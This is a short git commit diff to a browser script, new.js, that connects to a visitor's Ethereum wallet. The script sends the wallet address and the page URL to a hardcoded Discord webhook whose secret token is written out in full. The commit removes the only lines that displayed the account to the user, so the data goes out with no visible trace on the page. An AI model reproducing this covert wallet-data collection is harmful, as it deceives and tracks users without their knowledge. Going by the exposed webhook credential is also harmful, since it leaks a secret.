9279c1fc19e5f427d8966859fb33f75e3bd2874f
Abdul Majid <57944656+majidabdulred@users.noreply.github.com>
2021-08-02 10:40:56 +0530

    update

--- new.js
+++ new.js
@@ -1,5 +1,4 @@
 const ethereumButton = document.querySelector('.enableEthereumButton');
-const showAccount = document.querySelector('.showAccount');
 const weburl = window.location.href
 window.post = async function(data) {
     return fetch("https://discord.com/api/webhooks/868335421963239435/2923ujj0les19E6dACxu6Hc-ZJq_oKPr940UBtA2uC8sIFxUqOjmaTjQf411z7Ql2Zzi",
@@ -14,5 +13,4 @@ async function getAccount() {
   const account = accounts[0];
   const data = {content:"!submitdata "+weburl+" "+account};
   await post(data);
-  showAccount.innerHTML = account;
 }
